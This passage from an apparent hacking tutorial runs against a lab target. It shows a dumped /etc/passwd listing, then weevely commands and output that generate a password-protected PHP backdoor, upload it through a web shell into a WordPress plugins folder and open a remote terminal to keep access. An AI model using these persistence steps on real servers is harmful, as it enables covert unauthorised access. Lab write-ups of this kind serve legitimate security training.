`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">avahi:x:497:492:avahi-daemon:/var/run/avahi-daemon:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">haldaemon:x:68:491:HAL daemon:/:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">openvpn:x:496:490:OpenVPN:/etc/openvpn:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">apache:x:48:489:Apache:/var/www:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">saslauth:x:495:488:"Saslauthd user":/var/empty/saslauth:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">mailnull:x:47:487::/var/spool/mqueue:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">smmsp:x:51:486::/var/spool/mqueue:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">smolt:x:494:485:Smolt:/usr/share/smolt:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">sshd:x:74:484:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">pulse:x:493:483:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">gdm:x:42:481::/var/lib/gdm:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">p0wnbox.Team:x:500:500:p0wnbox.Team:/home/p0wnbox.Team:/bin/bash `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">mysql:x:27:480:MySQL Server:/var/lib/mysql:/bin/bash `

 

  

 

We can crack all users passwords with the “john the ripper” tool.

But we will not do this; we want to maintain access on this server so we can come to visit/hack it any time J



We will use weevely to a small and encoded php backdoor with the password protected and upload this php backdoor to our server.

Let’s do it

1 – weevely usage options :

[?](http://resources.infosecinstitute.com/hacking-a-wordpress-site/#)

 01

02

03

04

05

06

07

08

09

10

11

12

13

14

15

16

17

18

19

20

21

22

23

24

25

  `<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">root@bt:/pentest/backdoors/web/weevely# ./main.py - `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Weevely 0.3 - Generate and manage stealth PHP backdoors. `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Copyright (c) 2011-2012 Weevely Developers `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Website: <a href="http://code.google.com/p/weevely/" style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; text-decoration: initial; top: auto !important; vertical-align: baseline !important; width: auto !important;">http://code.google.com/p/weevely/</a> `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Usage: main.py [options] `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Options: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">-h, --help show this help message and exit `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">-g, --generate Generate backdoor crypted code, requires -o and -p . `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">-o OUTPUT, --output=OUTPUT `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Output filename for generated backdoor . `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">-c COMMAND, --command=COMMAND `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Execute a single command and exit, requires -u and -p `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">. `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">-t, --terminal Start a terminal-like session, requires -u and -p . `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">-C CLUSTER, --cluster=CLUSTER `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Start in cluster mode reading items from the give `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">file, in the form 'label,url,password' where label is `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">optional. `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">-p PASSWORD, --password=PASSWORD `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Password of the encrypted backdoor . `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">-u URL, --url=URL Remote backdoor URL .`

 

  

 

2 – Creating a php backdoor with password koko by using weevely:

[?](http://resources.infosecinstitute.com/hacking-a-wordpress-site/#)

 1

2

3

4

5

6

7

8

  `<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">root@bt:/pentest/backdoors/web/weevely# ./main.py -g -o hax.php -p koko `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Weevely 0.3 - Generate and manage stealth PHP backdoors. `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Copyright (c) 2011-2012 Weevely Developers `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Website: <a href="http://code.google.com/p/weevely/" style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; text-decoration: initial; top: auto !important; vertical-align: baseline !important; width: auto !important;">http://code.google.com/p/weevely/</a> `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">+ Backdoor file 'hax.php' created with password 'koko'.`

 

  

 



![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan50-300x40.png)

3 – Upload our php backdoor to server using php web shell

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan51-300x176.png)

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan52-300x42.png)

And after we upload it we will connect to it using



[?](http://resources.infosecinstitute.com/hacking-a-wordpress-site/#)

 01

02

03

04

05

06

07

08

09

10

11

12

  `<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">root@bt:/pentest/backdoors/web/weevely# ./main.py -t -u <a href="http://hack-test.com/Hackademic_RTB1/wp-content/plugins/hax.php" style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; text-decoration: initial; top: auto !important; vertical-align: baseline !important; width: auto !important;">http://hack-test.com/Hackademic_RTB1/wp-content/plugins/hax.php</a> -p koko `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Weevely 0.3 - Generate and manage stealth PHP backdoors. `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Copyright (c) 2011-2012 Weevely Developers `

